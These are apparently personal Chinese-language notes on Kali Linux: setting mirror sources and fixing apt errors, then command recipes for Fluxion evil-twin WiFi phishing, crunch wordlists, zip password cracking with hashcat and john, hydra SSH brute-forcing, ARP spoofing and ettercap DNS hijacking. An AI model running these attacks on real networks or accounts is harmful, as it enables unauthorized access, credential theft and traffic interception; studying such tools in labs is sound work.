# 1. 更换国内源

### 1）更新源

`vim /etc/apt/sources.list`**  

复制下面源码 选择一个  粘贴到里面，并把原来的源注释掉：

    deb http://mirrors.ustc.edu.cn/debian/ buster main contrib non-free
    deb http://mirrors.ustc.edu.cn/debian/ buster-updates main contrib non-free
    deb http://mirrors.ustc.edu.cn/debian/ buster-backports main contrib non-free
    deb http://mirrors.ustc.edu.cn/debian-security buster/updates main contrib non-free
    
    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    
    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    
    deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    
    deb http://mirrors.neusoft.edu.cn/kali> kali-rolling/main non-free contrib
    deb-src http://mirrors.neusoft.edu.cn/kali> kali-rolling/main non-free contrib
```bash
sudo apt-get update #更新软件列表
sudo apt-get upgrade #更新软件
合并为：
apt-get update && apt-get upgrade
sudo apt-get dist-upgrade #升级
sudo apt-get clean #删除缓存包
sudo apt-get autoclean #删除未安装的deb包
```

### 缺少pyrit，并且E :pyrit无法定位的问题：

手动安装pyrit

```bash
git clone https://github.com/hacker3983/pyrit-installer.git
```

```bash
 bash install.sh
```

### 出现存在软件包未满足依赖时：

有的比较老的博客提供镜像源的版本是bonic，你的系统版本可能比较新可能是focal， 直接复制别人的镜像源，版本代码对不上， 就会出错。

```bash
#运行：
apt --fix-broken install
```

![image-20240309000436276](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240309000436276.png?token=ANG32YAYUCDRH27QRDYTFQTF5M32A)

### 当出现更新源签名无效问题时：

![image-20240308222536760](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240308222536760.png?token=ANG32YFQKKYRTQEWKTWJSMDF5MXYE)

* 下载签名并且安装

  ```bash
  wget archive.kali.org/archive-key.asc     #root用户下
  
  apt-key add archive-key.asc
  ```

* 更新源和软件

  ```bash
  apt-get update && apt-get upgrade && apt-get clean
  
  OK！
  ```

# 2. fluxion

## 1）安装

```bash
git clone git@github.com:FluxionNetwork/fluxion.git
./fluxion.sh -i
```

全部显示OK，否则检查软件源。

## 2）钓鱼WiFi

HandShake Snooper=>扫描2.4G信道=>选择WIFI_id=>重置攻击=>mdk4=>抓包成功会显示HandShake Snooper攻击完成

1选择攻击方式=>1创建WiFi=>重置攻击=>mdk3=>hostapd=>hash-cowpatty=>1使用抓到的hash=>2cowpatty验证=>1创建SSL证书

=>1断开原网络=>3Chinese=>出现6个窗口表示成功

# 3. 生成字典



```bash
crunch <min> <max> [options]	#min和max是生成的密码的最少、最长位数
```

示例：

```bash
crunch 2 3 012345 -o ./aaa.txt
```

# 4. 破解压缩包密码

爆破法破解：纯数字密码不超过十位的话还有希望，带标点的基本就不用试了，要是再带字母。

### 1）**解压缩全能王这样的云解密软件，只要服务器上存储有压缩包密码就可以获取。这种方法成功率最高。**

### 2）hashcat破解

* 获得压缩包hash-code

  ```bash
  zip2john aaa.zip > hash_code.txt
  ```

* 从aaa.txt中复制字符串前一部分到网站hashcat找到字符对应的hash-mode

  hashcat：https://hashcat.net/wiki/doku.php?id=example_hashes

* 破解

  ```bash
  hashcat -a 3 -m <hash-mode> hash_code.txt --increment ?d?d?d?d?d?d -o ./password.txt
  #-a 表示破解模式
  #6个?d表示六个纯数字
  ```

![image-20240310195450608](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240310195450608.png?token=ANG32YCCQWUZLPOUADHQSE3F5WQB2)

![image-20240310195523847](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240310195523847.png?token=ANG32YGJ5VAV3XVRDUBLS2LF5WQDO)

### 3）john破解

```bash
zip2john aaa.zip > hash_code.txt
john hash_code.txt
```

# 5. hydra爆破服务用户名和密码

支持服务：ssh、telnet、ftp、MySQL、RDP(端口3389)

`hydra 参数 IP 服务名`

| -    | -                                            |
| ---- | -------------------------------------------- |
| -l   | 指定登录用户名                               |
| -L   | 用户名字典（按照字典文件中用户名的顺序爆破） |
| -p   | 指定密码                                     |
| -P   | 密码字典                                     |
| -s   | 指定端口                                     |
| -t   | 设置线程数                                   |
| -o   | 输出文件                                     |
| -vV  | 显示详细过程                                 |

```bash
hydra -l root -P ./password.txt -t 4 -vV -s 22 127.0.0.1 ssh	##爆破ssh登录密码
hydra -L /usernameDict.txt -P ./password.txt -t 4 -vV -s 22 127.0.0.1 ssh	##爆破ssh登录密码
```

# 6. 中间人攻击

https://blog.csdn.net/m0_74806866/article/details/134853842

中间人（MITM）攻击在计算机出现之前就已经存在。这种类型的攻击包括攻击者将自己插入到相互通信的双方之间。中间人攻击本质上是窃听攻击。

```bash
ettercap -G
```

### 1）arp攻击断网

```bash
arpspoof -i eth0(网卡名) -t 靶机ip 网关
```

### 2）DNS劫持

* 在攻击机上启动Apache2服务：

  ```bash
  systemctl start apache2
  ```

* 修改ettercap配置文件。添加一条记录将域名指向攻击机IP：

  ```bash
  vim /etc/ettercap/etter.dns
  www.baidu.com	A	攻击机IP
  ```

  ![image-20240311011517517](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240311011517517.png)

* 开始

  ```bash
  ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /靶机IP// /网关// ；
  ```

  靶机解析www.baidu.com域名时跳转到攻击机IP。

# 7. BrupSuite隐匿IP

https://www.52pojie.cn/thread-1544866-1-1.html

https://blog.csdn.net/dust_hk/article/details/117071784

